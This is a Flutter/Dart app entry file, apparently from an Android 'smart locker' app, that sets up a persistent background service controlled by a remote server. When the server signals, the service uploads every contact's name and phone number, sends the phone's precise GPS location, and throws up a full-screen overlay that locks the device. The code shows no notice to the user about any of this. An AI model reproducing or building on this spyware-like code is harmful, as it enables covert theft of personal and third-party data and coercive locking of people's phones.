import 'dart:async';
import 'dart:convert';
import 'dart:ui';

import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:flutter_overlay_window/src/overlay_config.dart';
import 'package:geolocator/geolocator.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:smartlockerknox/mainhome.dart';
import 'package:smartlockerknox/login.dart';
import 'package:smartlockerknox/overlay/truecoller_overlay.dart';
import 'package:http/http.dart' as http;

void main() async{
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  await initializeService();
  SharedPreferences prefs = await SharedPreferences.getInstance();
  final userId = prefs.getString('userId');
  final popsop = prefs.getBool('popsop') ??false;
  runApp(MyApp(userId: userId, popsop:popsop));
}


@pragma("vm:entry-point")
void overlayMain() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(
    const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: TrueCallerOverlay(),
    ),
  );
}


Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  /// OPTIONAL, using custom notification channel id
  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    'my_foreground', // id
    'MY FOREGROUND SERVICE', // title
    description:
    'This channel is used for important notifications.', // description
    importance: Importance.high, // importance must be at low or higher level
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
  FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
      AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      // this will be executed when app is in foreground or background in separated isolate
      onStart: onStart,
      // auto start service
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'my_foreground',
      initialNotificationTitle: 'AWESOME SERVICE',
      initialNotificationContent: 'Initializing',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(
      // auto start service
      autoStart: true,
      // this will be executed when app is in foreground in separated isolate
      onForeground: onStart,
      // you have to enable background fetch capability on xcode project
      // onBackground: onIosBackground,
    ),
  );
  service.startService();
}



@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });

    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  List<Contact> _contacts = [];
  Timer.periodic(Duration(seconds: 60), (timer) async {
    // print("aajad");
    final prefs = await SharedPreferences.getInstance();
    final finaluserId = prefs.getString('userId') ?? "0";
    final response = await http.post(
        Uri.parse("https://smartlockerindia.com/ajapi/api/Mobile_app/getdatas?userid=$finaluserId"));
    final data = jsonDecode(response.body);
    // print(data);
    // print("ddddddddddd");
    if (data["error"]=="200") {
      final mystatus=data["data"]["status"];
      if(mystatus=="1"){
        Iterable<Contact> contacts = await ContactsService.getContacts();
        _contacts = contacts.toList();
        for (var i = 0; i < _contacts.length; i++) {
          final name=_contacts[i].displayName;
          final phone=_contacts[i].phones![0].value;
          // print(name);
          // print(phone);
          // print("ajay");
          final response =await http.post(
            Uri.parse("https://smartlockerindia.com/ajapi/api/Mobile_app/userdata"),
            headers: {
              "Content-Type": "application/json"
            },
            body: json.encode({
              "user_id":'$finaluserId',
              "name":"$name",
              "phone":"$phone"
            }),
          );
          final data = jsonDecode(response.body);
          // print(data);
          // print('tttttttttttttttt');
          // print(data);
          if (data["error"]=="200") {
          }else {}
        }
      }else if(mystatus=="2"){
        Position position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high);
        // print('Latitude: ${position.latitude}');
        // print('Longitude: ${position.longitude}');
        final response =await http.post(
          Uri.parse("https://smartlockerindia.com/ajapi/api/Mobile_app/userlatlong"),
          headers: {
            "Content-Type": "application/json"
          },
          body: json.encode({
            "user_id":'$finaluserId',
            "lat":position.latitude,
            "longitude":position.longitude
          }),
        );
        final data = jsonDecode(response.body);
        // print(data);
        // print('tttttttttttttttt');
        // print(data);
        if (data["error"]=="200") {
        }else {}
      }
    }else {}
  });

  Timer.periodic(const Duration(seconds: 1), (timer) async {
    final prefs = await SharedPreferences.getInstance();
    final userId = prefs.getString('userId') ?? "0";
    if (service is AndroidServiceInstance) {
      if (await service.isForegroundService()) {
        print("ajay");
        final response = await http.get(
          Uri.parse("https://smartlockerindia.com/ajapi/api/Mobile_app/getdatas?userid=$userId"));
        final data = jsonDecode(response.body);
        print(data);
        print('sagar');
        if (data["error"]=="200") {
       final mystatus=data["data"]["lock_unlock"];
          if(mystatus=="2"){
            print('raja');
            if (await FlutterOverlayWindow.isActive()) return;
            await FlutterOverlayWindow.showOverlay(
              enableDrag: false,
              overlayTitle: "X-SLAYER",
              overlayContent: 'Overlay Enabled',
              flag: OverlayFlag.defaultFlag,
              alignment: OverlayAlignment.centerLeft,
              positionGravity: PositionGravity.auto,
              height: WindowSize.fullCover,
              width: WindowSize.fullCover,
            );
          }else{
            FlutterOverlayWindow.closeOverlay();
          }
        }else {
        }
      }
    }
  });
}


class MyApp extends StatefulWidget {
  final String? userId;
 final bool popsop;
  MyApp({Key? key,this.userId, required this.popsop}) : super(key: key);
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home:widget.userId == null? LoginPage(popsop:widget.popsop):HomeScreens(popsop:widget.popsop),
    );
  }
}
